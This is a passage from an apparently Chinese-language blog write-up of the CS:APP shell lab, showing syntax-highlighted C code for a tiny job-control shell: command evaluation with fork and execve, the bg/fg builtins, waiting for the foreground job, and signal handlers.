class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">sigset_t</span> <span class="hljs-built_in">set</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> state = UNDEF;<br>    <span class="hljs-keyword">char</span> *argv[MAXLINE];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == parseline(cmdline, argv))<br>        state = BG;<br>    <span class="hljs-keyword">else</span><br>        state = FG;<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv))<br>    &#123;<br>        sigemptyset(&amp;<span class="hljs-built_in">set</span>);<br>        sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGINT), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGCHLD), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGSTOP);<br>        sigprocmask(SIG_BLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;fork error!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">//进入到了fork出来的子程序</span><br>        &#123;<br>            sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br>            setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//1.路径 2.参数（包括1） 3.环境变量</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: commond not found!&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//fork完成， 加入joblist</span><br>        addjob(jobs, pid, state, cmdline);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;sigprocmask error&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (state == FG)<br>            waitfg(pid);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-builtin-cmd-判断是否内置函数并跳转"><a href="#2-builtin-cmd-判断是否内置函数并跳转" class="headerlink" title="2.builtin_cmd()判断是否内置函数并跳转"></a>2.<code>builtin_cmd()</code>判断是否内置函数并跳转</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>        do_bgfg(argv);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>))<br>        listjobs(jobs);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* not a builtin command */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-do-bgfg-执行bg-fg命令"><a href="#3-do-bgfg-执行bg-fg命令" class="headerlink" title="3.do_bgfg()执行bg fg命令"></a>3.<code>do_bgfg()</code>执行bg fg命令</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> parsed;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span> (!argv[<span class="hljs-number">1</span>])<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s commond requires PID or %%JID argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-comment">//错误检查以及取出PID或者JID</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobjid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such job\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobpid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//fg和bg分别处理</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>))<br>    &#123;<br>        job-&gt;state = BG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//发送signal到groupid为|job-&gt;pid|的组</span><br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>    &#123;<br>        job-&gt;state = FG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        waitfg(job-&gt;pid);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do_bgfg: Internal error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-waitfg-等待前台程序结束"><a href="#4-waitfg-等待前台程序结束" class="headerlink" title="4.waitfg()等待前台程序结束"></a>4.<code>waitfg()</code>等待前台程序结束</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//使用sigsuspend</span><br>    <span class="hljs-keyword">sigset_t</span> sig, prev;<br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGCHLD);<br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;prev);<br>    <br>    <span class="hljs-keyword">while</span>(pid == fgpid(jobs))<br>        sigsuspend(&amp;prev);<br>    <br>    sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(verbose)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-signal-handlers"><a href="#5-signal-handlers" class="headerlink" title="5.signal_handlers"></a>5.<code>signal_handlers</code></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))<br>        &#123; <span class="hljs-comment">/*process is exited in normal way*/</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSIGNALED(status))<br>        &#123; <span class="hljs-comment">/*process is terminated by a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSTOPPED(status))<br>        &#123; <span class="hljs-comment">/*process is stop because of a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>            <span class="hljs-keyword">if</span> (job != <span class="hljs-literal">NULL</span>)<br>                job-&gt;state = ST;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        kill(-pid, SIGINT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>        <span class="hljs-keyword">if</span> (job-&gt;state == ST)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            kill(-pid, SIGTSTP);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其余代码"><a href="#其余代码" class="headerlink" title="其余代码"></a>其余代码</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span 